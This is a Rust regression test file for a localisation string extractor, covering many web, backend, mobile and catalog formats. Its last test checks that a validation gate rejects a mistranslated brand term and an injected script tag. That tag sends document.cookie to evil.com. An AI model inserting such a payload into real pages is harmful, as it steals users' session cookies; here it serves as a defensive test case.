//! Exhaustive Multi-Language & Framework Regression Suite for ptyktos-lingo.
//!
//! Grounded in Sanguine's theorem: `adapt = fromTerm ∘ universalLift`.
//! Validates 100% feature coverage and semantic equivalence across:
//! - Web Frameworks: React TSX/JSX, Vue 3 SFC, Svelte, Angular, SolidJS, Astro, HTML/Jinja/Blade
//! - Documentation: Markdown & MDX
//! - Backend & Systems: Python/Django, Go, Ruby on Rails, PHP/Laravel, Rust
//! - Native Mobile: Apple iOS Swift & .strings, Android Kotlin & XML, Flutter Dart & ARB
//! - Enterprise Resource Catalogs: JSON, YAML, PO/POT, Fluent, Properties, XLIFF 1.2/2.0, CSV
//! - Gate Invariants: Slot preservation, numbered tag conservation, and protected brand glossaries.

use glossa::emitters::resource;
use glossa::engine::gate::ApeironNullGate;
use glossa::ir::term::ApeironTerm;
use glossa::parsers::code::extract_code_strings;
use glossa::parsers::jsx::extract_jsx;
use glossa::parsers::resource::{
    extract_android_xml, extract_fluent, extract_flutter_arb, extract_ios_strings, extract_json,
    extract_po, extract_properties, extract_xliff, extract_yaml,
};
use glossa::parsers::svelte::extract_svelte;
use glossa::parsers::vue::extract_vue;
use std::collections::BTreeMap;

// =========================================================================
// 1. REACT / NEXT.JS (TSX / JSX) REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_react_nextjs_complex() {
    let tsx_source = r#"
    import React from 'react';
    import { useTranslations } from 'next-intl';
    import { FormattedMessage } from 'react-intl';

    export default function CheckoutModal({ user, cart, onConfirm }) {
        const t = useTranslations('Checkout');
        return (
            <div className="modal-backdrop">
                <dialog open aria-labelledby="dialog-title">
                    <h2 id="dialog-title">{t('Review Your Order')}</h2>
                    <p className="order-summary">
                        Hello {user.name}, you have selected {cart.items.length} items.
                    </p>
                    <div className="cta-container">
                        <button onClick={onConfirm} title="Finalize purchase">
                            Complete Order for <strong>${cart.total}</strong>
                        </button>
                        <a href="/terms" target="_blank" rel="noopener noreferrer">
                            Read our <span className="underline">Terms of Service</span>
                        </a>
                    </div>
                </dialog>
            </div>
        );
    }
    "#;

    let items = extract_jsx(tsx_source, "CheckoutModal.tsx");
    assert!(!items.is_empty(), "Must extract JSX items");

    // Check slot and tag extraction
    let order_summary = items
        .iter()
        .find(|it| it.canonical_text.contains("Hello {user.name}"))
        .expect("Must extract order summary with user.name slot");
    assert!(order_summary.canonical_text.contains("{cart.items.length}"));

    // Check nested markup tag conservation
    let terms_link = items
        .iter()
        .find(|it| it.canonical_text.contains("Terms of Service"))
        .expect("Must extract nested link text");
    assert!(terms_link.canonical_text.contains("<0>"));
}

// =========================================================================
// 2. VUE 3 SFC REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_vue_sfc_complex() {
    let vue_source = r#"
    <template>
        <section class="billing-panel">
            <header>
                <h1>{{ $t('Billing & Invoices') }}</h1>
                <p>Manage subscription for team {{ team.name }}</p>
            </header>
            <main>
                <div class="alert-box">
                    Your next renewal date is {{ renewalDate }}.
                </div>
                <button @click="upgradePlan">Upgrade to Enterprise</button>
            </main>
        </section>
    </template>
    <script setup lang="ts">
    defineProps<{ team: { name: string }, renewalDate: string }>();
    </script>
    "#;

    let items = extract_vue(vue_source, "BillingPanel.vue");
    assert!(!items.is_empty());

    let team_item = items
        .iter()
        .find(|it| it.canonical_text.contains("Manage subscription for team"))
        .expect("Must extract team template text");
    assert!(team_item.canonical_text.contains("{team.name}"));

    let upgrade_btn = items
        .iter()
        .find(|it| it.canonical_text == "Upgrade to Enterprise")
        .expect("Must extract button text");
    assert_eq!(upgrade_btn.canonical_text, "Upgrade to Enterprise");
}

// =========================================================================
// 3. SVELTE REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_svelte_complex() {
    let svelte_source = r#"
    <script>
        import { t } from '$lib/i18n';
        export let projectName = "Alpha";
        export let activeMembers = 12;
    </script>

    <aside class="sidebar">
        <h2>{t('Workspace Management')}</h2>
        <div class="metrics">
            Active project {projectName} has {activeMembers} contributors online.
        </div>
        <button on:click={() => alert('Saved')}>Save Changes</button>
    </aside>
    "#;

    let items = extract_svelte(svelte_source, "Sidebar.svelte");
    assert!(!items.is_empty());

    let metrics = items
        .iter()
        .find(|it| it.canonical_text.contains("Active project"))
        .expect("Must extract Svelte metrics");
    assert!(metrics.canonical_text.contains("{projectName}"));
    assert!(metrics.canonical_text.contains("{activeMembers}"));
}

// =========================================================================
// 4. ANGULAR TEMPLATE & TYPESCRIPT ($localize) REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_angular_localize() {
    let ts_source = r#"
    import { Component } from '@angular/core';

    @Component({
        selector: 'app-user-badge',
        templateUrl: './user-badge.component.html'
    })
    export class UserBadgeComponent {
        title = $localize`:@@badge.title:Verified Member`;
        tooltip = $localize`User has passed identity verification`;
        pointsLabel = $localize`:@@points.counter:Total Score: ${42}:score:`;
    }
    "#;

    let items = extract_code_strings(ts_source, "user-badge.component.ts");
    assert_eq!(items.len(), 3);

    let title_item = items
        .iter()
        .find(|it| it.key.as_deref() == Some("badge.title"))
        .expect("Must extract angular key");
    assert_eq!(title_item.canonical_text, "Verified Member");
}

// =========================================================================
// 5. SOLIDJS & ASTRO REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_solid_and_astro() {
    let astro_source = r#"
    ---
    import Layout from '../layouts/Layout.astro';
    const siteTitle = t("Welcome to Sovereign Cloud");
    ---
    <Layout title={siteTitle}>
        <main>
            <h1>{t("High Performance Microkernels")}</h1>
            <p>Deploy anywhere with zero configuration.</p>
        </main>
    </Layout>
    "#;

    let items = extract_code_strings(astro_source, "index.astro");
    assert!(!items.is_empty());
    assert!(items
        .iter()
        .any(|i| i.canonical_text == "Welcome to Sovereign Cloud"));
    assert!(items
        .iter()
        .any(|i| i.canonical_text == "High Performance Microkernels"));
}

// =========================================================================
// 6. BACKEND: PYTHON (DJANGO / FASTAPI) REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_python_django_fastapi() {
    let py_source = r#"
    from django.utils.translation import gettext as _, ngettext
    from fastapi import HTTPException

    def validate_account(user, quota_remaining):
        if not user.is_active:
            raise HTTPException(status_code=403, detail=_("Account has been temporarily suspended"))
        
        msg = _("Welcome back, {username}! You have {quota} API calls remaining.")
        flash = _("Please confirm your email address within 24 hours.")
        return msg.format(username=user.name, quota=quota_remaining)
    "#;

    let items = extract_code_strings(py_source, "auth_service.py");
    assert_eq!(items.len(), 3);
    assert!(items.iter().any(|i| i
        .canonical_text
        .contains("Account has been temporarily suspended")));
    assert!(items
        .iter()
        .any(|i| i.canonical_text.contains("{username}")));
}

// =========================================================================
// 7. BACKEND: GO REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_go_i18n() {
    let go_source = r#"
    package handlers

    import (
        "github.com/nicksnyder/go-i18n/v2/i18n"
    )

    func RenderClusterStatus(localizer *i18n.Localizer) {
        title := localizer.MustLocalize(&i18n.LocalizeConfig{
            DefaultMessage: &i18n.Message{
                ID: "ClusterStatus",
                Other: "All cluster nodes operational",
            },
        })
        short := i18n.T("Node synchronized successfully")
        fail := t("Connection timeout to master broker")
    }
    "#;

    let items = extract_code_strings(go_source, "cluster.go");
    assert!(items
        .iter()
        .any(|i| i.canonical_text == "Node synchronized successfully"));
    assert!(items
        .iter()
        .any(|i| i.canonical_text == "Connection timeout to master broker"));
}

// =========================================================================
// 8. BACKEND: RUBY ON RAILS & PHP LARAVEL REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_rails_and_laravel() {
    let rb_source = r#"
    class SubscriptionsController < ApplicationController
        def cancel
            @notice = I18n.t("subscription.cancelled_successfully")
            flash[:alert] = t("Your access will remain active until end of period")
        end
    end
    "#;
    let rb_items = extract_code_strings(rb_source, "subscriptions_controller.rb");
    assert!(rb_items
        .iter()
        .any(|i| i.canonical_text == "subscription.cancelled_successfully"));
    assert!(rb_items
        .iter()
        .any(|i| i.canonical_text == "Your access will remain active until end of period"));

    let php_source = r#"
    <?php
    namespace App\Http\Controllers;

    class AuthController {
        public function login() {
            $msg = __('Invalid credentials provided. Please check your password.');
            $hint = trans('auth.password_reset_sent');
            return response()->json(['message' => $msg, 'hint' => $hint]);
        }
    }
    "#;
    let php_items = extract_code_strings(php_source, "AuthController.php");
    assert!(php_items
        .iter()
        .any(|i| i.canonical_text == "Invalid credentials provided. Please check your password."));
    assert!(php_items
        .iter()
        .any(|i| i.canonical_text == "auth.password_reset_sent"));
}

// =========================================================================
// 9. NATIVE MOBILE: APPLE IOS SWIFT & .STRINGS REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_apple_ios() {
    let swift_source = r#"
    import SwiftUI

    struct SettingsView: View {
        var body: some View {
            VStack {
                Text(NSLocalizedString("Privacy Settings", comment: "Header for privacy section"))
                Text(String(localized: "Manage your encryption keys and certificates"))
            }
        }
    }
    "#;
    let swift_items = extract_code_strings(swift_source, "SettingsView.swift");
    assert!(swift_items
        .iter()
        .any(|i| i.canonical_text == "Privacy Settings"));
    assert!(swift_items
        .iter()
        .any(|i| i.canonical_text == "Manage your encryption keys and certificates"));

    let strings_file = r#"
    /* Privacy Settings Header */
    "privacy_header" = "Privacy & Encryption Settings";
    "cert_count" = "Installed %ld certificates for user %@";
    "#;
    let strings_items = extract_ios_strings(strings_file, "Localizable.strings");
    assert_eq!(strings_items.len(), 2);
    assert!(strings_items
        .iter()
        .any(|i| i.key.as_deref() == Some("privacy_header")));
    let cert_item = strings_items
        .iter()
        .find(|i| i.key.as_deref() == Some("cert_count"))
        .unwrap();
    assert!(cert_item.canonical_text.contains("{var}"));
}

// =========================================================================
// 10. NATIVE MOBILE: ANDROID XML REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_android_xml() {
    let xml_source = r#"
    <?xml version="1.0" encoding="utf-8"?>
    <resources>
        <string name="app_name">Apeiron Kernel Monitor</string>
        <string name="sync_status">Syncing with peer %1$s: %2$d%% complete</string>
        <string name="btn_reconnect">Reconnect Now</string>
    </resources>
    "#;

    let items = extract_android_xml(xml_source, "res/values/strings.xml");
    assert_eq!(items.len(), 3);
    assert!(items.iter().any(|i| i.key.as_deref() == Some("app_name")));
    assert!(items
        .iter()
        .any(|i| i.canonical_text == "Apeiron Kernel Monitor"));
}

/// Real fixture: verbatim lines from `mendhak/gpslogger`'s actual
/// `strings.xml` (a real, live Crowdin-using Android app). Regression guard
/// for a bug found by testing against this real file: numeric XML character
/// references (`&#160;` non-breaking space, `&#176;` degree sign, `&#189;`
/// half fraction — 18 total occurrences in this one real file, 0 named
/// entities) were left as literal un-decoded text instead of the actual
/// characters they represent.
#[test]
fn test_regression_android_xml_real_world_numeric_entities() {
    let xml_source = r#"
    <?xml version="1.0" encoding="utf-8" ?>
    <resources>
        <string name="foot">&#160;foot</string>
        <string name="feet">&#160;feet</string>
        <string name="time_halfminute">&#189; minute</string>
        <string name="time_oneandhalfhours">1&#189; hours</string>
        <string name="degree_symbol" translatable="false">&#176;</string>
    </resources>
    "#;

    let items = extract_android_xml(xml_source, "res/values/strings.xml");
    assert_eq!(items.len(), 5);

    let foot = items
        .iter()
        .find(|i| i.key.as_deref() == Some("foot"))
        .unwrap();
    assert_eq!(
        foot.canonical_text, "\u{00A0}foot",
        "must decode &#160; to an actual non-breaking space, not keep the literal text"
    );

    let half = items
        .iter()
        .find(|i| i.key.as_deref() == Some("time_halfminute"))
        .unwrap();
    assert_eq!(
        half.canonical_text, "\u{00BD} minute",
        "must decode &#189; to the actual ½ character"
    );

    let mixed = items
        .iter()
        .find(|i| i.key.as_deref() == Some("time_oneandhalfhours"))
        .unwrap();
    assert_eq!(mixed.canonical_text, "1\u{00BD} hours");

    let degree = items
        .iter()
        .find(|i| i.key.as_deref() == Some("degree_symbol"))
        .unwrap();
    assert_eq!(
        degree.canonical_text, "\u{00B0}",
        "must decode &#176; to the actual degree sign"
    );
}

/// Confirms named XML entities (not present in the gpslogger fixture above,
/// but standard and common in other real Android/iOS/web catalogs) decode
/// correctly and that a malformed/unrecognized entity is left as literal
/// text rather than silently eating characters.
#[test]
fn test_regression_android_xml_named_entities_and_malformed_fallback() {
    let xml_source = r#"
    <resources>
        <string name="terms">Terms &amp; Conditions</string>
        <string name="compare">5 &lt; 10 &gt; 3</string>
        <string name="not_an_entity">Ships &amp Handling</string>
    </resources>
    "#;

    let items = extract_android_xml(xml_source, "res/values/strings.xml");
    let terms = items
        .iter()
        .find(|i| i.key.as_deref() == Some("terms"))
        .unwrap();
    assert_eq!(terms.canonical_text, "Terms & Conditions");

    let compare = items
        .iter()
        .find(|i| i.key.as_deref() == Some("compare"))
        .unwrap();
    assert_eq!(compare.canonical_text, "5 < 10 > 3");

    // "&amp Handling" (no trailing semicolon before the next word) is not a
    // well-formed entity — the '&' must survive as a literal character
    // rather than the decoder eating "amp Handling" looking for a ';'.
    let malformed = items
        .iter()
        .find(|i| i.key.as_deref() == Some("not_an_entity"))
        .unwrap();
    assert!(
        malformed.canonical_text.contains('&'),
        "malformed entity must fall back to a literal '&', not silently drop text"
    );
}

// =========================================================================
// 10b. INLANG MESSAGE REFERENCES IN REAL JSON CATALOGS
// =========================================================================

/// Real fixture: verbatim entries from `AppFlowy-IO/AppFlowy`'s actual
/// production translation catalog
/// (`frontend/resources/translations/en-US.json`, a real, live inlang user
/// whose own `project.inlang/settings.json` declares
/// `variableReferencePattern: ["@:"]`). 44 occurrences of `@:identifier`
/// message references exist in that one real file. Regression guard for a
/// gap found by testing extraction against it: `@:appName` was extracted as
/// plain translatable text with no slot, so a translation provider would see
/// the literal characters "@:appName" as English words rather than a
/// verbatim cross-reference to another key's value.
#[test]
fn test_regression_inlang_message_reference_real_world_appflowy() {
    let json = r#"{
        "appName": "AppFlowy",
        "welcomeText": "Welcome to @:appName",
        "signUp": {
            "title": "Sign Up to @:appName"
        },
        "chat": {
            "changeFormat": { "text": "Text" },
            "textWithImageDescription": "@:chat.changeFormat.text with image"
        }
    }"#;

    let items = extract_json(json, "translations/en-US.json");

    let welcome = items
        .iter()
        .find(|i| i.key.as_deref() == Some("welcomeText"))
        .unwrap();
    assert!(
        welcome
            .terms
            .iter()
            .any(|t| matches!(t, ApeironTerm::Slot { name, .. } if name == "appName")),
        "`@:appName` must become a Slot term, not get flattened into plain translatable text"
    );

    let signup = items
        .iter()
        .find(|i| i.key.as_deref() == Some("signUp.title"))
        .unwrap();
    assert!(signup
        .terms
        .iter()
        .any(|t| matches!(t, ApeironTerm::Slot { name, .. } if name == "appName")));

    // Dotted-path reference (@:chat.changeFormat.text) must be captured whole,
    // not truncated at the first '.' the way a bare identifier scan might.
    let nested_ref = items
        .iter()
        .find(|i| i.key.as_deref() == Some("chat.textWithImageDescription"))
        .unwrap();
    assert!(
        nested_ref.terms.iter().any(
            |t| matches!(t, ApeironTerm::Slot { name, .. } if name == "chat.changeFormat.text")
        ),
        "dotted-path message reference must be captured in full: {:?}",
        nested_ref.terms
    );
}

// =========================================================================
// 11. NATIVE MOBILE: FLUTTER ARB REGRESSION TESTS
// =========================================================================
#[test]
fn test_regression_flutter_arb() {
    let arb_source = r#"{
        "@@locale": "en",
        "pageTitle": "Device Telemetry",
        "@pageTitle": {
            "description": "Title displayed on telemetry screen"
        },
        "batteryStatus": "Battery level is at {percentage}%, temperature {temp}C",
        "@batteryStatus": {
            "placeholders": {
                "percentage": { "type": "int" },
                "temp": { "type": "double" }
            }
        }
    }"#;

    let items = extract_flutter_arb(arb_source, "intl_en.arb");
    assert_eq!(items.len(), 2);
    assert!(items
        .iter()
        .any(|i| i.key.as_deref() == Some("pageTitle") && i.canonical_text == "Device Telemetry"));
    let battery = items
        .iter()
        .find(|i| i.key.as_deref() == Some("batteryStatus"))
        .unwrap();
    assert!(battery.canonical_text.contains("{percentage}"));
    assert!(battery.canonical_text.contains("{temp}"));
}

// =========================================================================
// 12. ENTERPRISE CATALOGS: YAML, XLIFF, PROPERTIES, PO, FLUENT
// =========================================================================
#[test]
fn test_regression_catalogs_multi_format() {
    // YAML
    let yaml_source = r#"
    production:
      alerts:
        node_offline: "Node {node_id} went offline unexpectedly."
        cpu_throttle: "CPU core temperature exceeded safe limit."
    "#;
    let yaml_items = extract_yaml(yaml_source, "config/locales/en.yml");
    assert_eq!(yaml_items.len(), 2);
    assert!(yaml_items
        .iter()
        .any(|i| i.key.as_deref() == Some("production.alerts.node_offline")));

    // Properties
    let prop_source = r#"
    # Core system properties
    database.connection.failed = Failed to establish database connection on host {host}
    security.token.expired = Security token has expired.
    "#;
    let prop_items = extract_properties(prop_source, "system.properties");
    assert_eq!(prop_items.len(), 2);
    assert!(prop_items
        .iter()
        .any(|i| i.canonical_text.contains("{host}")));

    // XLIFF 1.2
    let xlf_source = r#"
    <xliff version="1.2">
      <file datatype="plaintext">
        <body>
          <trans-unit id="welcome_unit">
            <source>Welcome to Enterprise Cloud Orchestrator</source>
          </trans-unit>
        </body>
      </file>
    </xliff>
    "#;
    let xlf_items = extract_xliff(xlf_source, "en.xlf");
    assert_eq!(xlf_items.len(), 1);
    assert_eq!(xlf_items[0].key.as_deref(), Some("welcome_unit"));

    // PO
    let po_source = r#"
    msgid ""
    msgstr "Content-Type: text/plain; charset=UTF-8\n"

    msgctxt "security"
    msgid "Two-factor authentication required"
    msgstr ""
    "#;
    let po_items = extract_po(po_source, "en.po");
    assert_eq!(po_items.len(), 1);
    assert_eq!(
        po_items[0].canonical_text,
        "Two-factor authentication required"
    );

    // Fluent
    let ftl_source = r#"
    shared-storage-info = Disk space remaining: {$freeGb} GB out of {$totalGb} GB
    "#;
    let ftl_items = extract_fluent(ftl_source, "en.ftl");
    assert_eq!(ftl_items.len(), 1);
    assert!(ftl_items[0].canonical_text.contains("{freeGb}"));
}

// =========================================================================
// 13. ROUNDTRIP EMITTER FIDELITY (Zero Drift Verification)
// =========================================================================
#[test]
fn test_regression_roundtrip_emitters() {
    let mut catalog = BTreeMap::new();
    catalog.insert("greeting".to_string(), "Hello, {name}!".to_string());
    catalog.insert(
        "footer.terms".to_string(),
        "All rights reserved.".to_string(),
    );

    // JSON Roundtrip
    let json_str = resource::emit_json(&catalog);
    let extracted_json = extract_json(&json_str, "virtual.json");
    assert_eq!(extracted_json.len(), 2);
    assert!(extracted_json
        .iter()
        .any(|i| i.canonical_text == "Hello, {name}!"));

    // YAML Roundtrip
    let yaml_str = resource::emit_yaml(&catalog, "en");
    let extracted_yaml = extract_yaml(&yaml_str, "virtual.yml");
    assert_eq!(extracted_yaml.len(), 2);
    assert!(extracted_yaml
        .iter()
        .any(|i| i.canonical_text == "Hello, {name}!"));

    // PO Roundtrip
    let po_str = resource::emit_po(&catalog, "en");
    let extracted_po = extract_po(&po_str, "virtual.po");
    assert_eq!(extracted_po.len(), 2);

    // Fluent Roundtrip
    let ftl_str = resource::emit_fluent(&catalog);
    let extracted_ftl = extract_fluent(&ftl_str, "virtual.ftl");
    assert_eq!(extracted_ftl.len(), 2);
}

// =========================================================================
// 14. APEIRON NULL-GATE: GLOSSARY & ADVERSARIAL INJECTION INTEGRITY
// =========================================================================
#[test]
fn test_regression_null_gate_and_glossary() {
    // 1. Protected Glossary enforcement
    let mut glossary = BTreeMap::new();
    glossary.insert("Ptyktos".to_string(), "Ptyktos".to_string());
    glossary.insert("Apeiron".to_string(), "Apeiron".to_string());

    let src = "Powered by Ptyktos on the Apeiron architecture.";
    let valid_trans = "Propulsé par Ptyktos sur l'architecture Apeiron.";
    assert!(ApeironNullGate::validate_with_glossary(src, valid_trans, Some(&glossary)).is_ok());

    // Corrupted brand term (e.g. LLM translated "Apeiron" into "Infini")
    let bad_trans = "Propulsé par Ptyktos sur l'architecture Infini.";
    let err = ApeironNullGate::validate_with_glossary(src, bad_trans, Some(&glossary)).unwrap_err();
    assert!(matches!(
        err,
        glossa::engine::gate::GateViolation::GlossaryViolation { .. }
    ));

    // 2. Adversarial XSS Attack caught
    let xss_trans =
        "¡Bienvenido!<script>fetch('http://evil.com/leak?cookie='+document.cookie)</script>";
    assert!(ApeironNullGate::validate("Welcome!", xss_trans).is_err());

    // 3. Mismatched tag order caught
    let bad_tags = "¡Haz clic <0>aquí</1> para continuar!";
    assert!(ApeironNullGate::validate("Click <0>here</0> to proceed!", bad_tags).is_err());
}
